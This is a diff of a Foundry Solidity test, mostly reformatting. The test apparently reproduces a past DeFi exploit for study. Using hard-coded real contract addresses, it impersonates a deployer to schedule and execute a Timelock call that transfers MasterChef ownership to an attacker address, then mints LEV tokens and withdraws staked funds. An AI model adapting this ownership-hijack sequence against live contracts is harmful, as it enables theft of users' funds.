@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.10;
+pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
@@ -21,10 +21,10 @@ All thanks to the creator of this awesome repo
 
 */
 contract ContractTest is Test {
-
     ILEV LEV = ILEV(0x304c62b5B030176F8d328d3A01FEaB632FC929BA);
 
-    IMasterChef MasterChef = IMasterChef(0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4);
+    IMasterChef MasterChef =
+        IMasterChef(0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4);
 
     ITimelock Timelock = ITimelock(0x16149999C85c3E3f7d1B9402a4c64d125877d89D);
     address attacker = 0x7507f84610f6D656a70eb8CDEC044674799265D3;
@@ -43,8 +43,12 @@ contract ContractTest is Test {
     }
 
     function test_Timelock() public {
-        bytes memory Ownership_hijack =
-            (abi.encodePacked(bytes4(keccak256(bytes("transferOwnership(address)"))), abi.encode(address(attacker))));
+        bytes memory Ownership_hijack = (
+            abi.encodePacked(
+                bytes4(keccak256(bytes("transferOwnership(address)"))),
+                abi.encode(address(attacker))
+            )
+        );
 
         //Schedule a transaction from the Deployer current owner of timelock.
         vm.startPrank(address(Deployer));
@@ -54,7 +58,9 @@ contract ContractTest is Test {
             0,
             Ownership_hijack,
             bytes32(0),
-            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764),
+            bytes32(
+                0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764
+            ),
             172_800
         );
 
@@ -64,7 +70,9 @@ contract ContractTest is Test {
             0,
             Ownership_hijack,
             bytes32(0),
-            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)
+            bytes32(
+                0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764
+            )
         );
 
         assertTrue(Timelock.isOperationPending(txHash));
@@ -78,7 +86,9 @@ contract ContractTest is Test {
             0,
             Ownership_hijack,
             bytes32(0),
-            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)
+            bytes32(
+                0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764
+            )
         );
 
         assertTrue(Timelock.isOperationDone(txHash));
@@ -110,11 +120,9 @@ contract ContractTest is Test {
         MasterChef.emergencyWithdraw(4);
         vm.stopPrank();
     }
-
 }
 
 interface ITimelock {
-
     function schedule(
         address target,
         uint256 value,
@@ -139,20 +147,15 @@ interface ITimelock {
         bytes32 salt
     ) external;
     function isOperationDone(bytes32 id) external returns (bool done);
-
 }
 
 interface ILEV {
-
     function mint(address receiver, uint256 amount) external;
-
 }
 
 interface IMasterChef {
-
     function recoverLevOwnership() external;
     function leaveStaking(uint256 _amount) external;
     function withdraw(uint256 _pid, uint256 _amount) external;
     function emergencyWithdraw(uint256 _pid) external;
-
 }
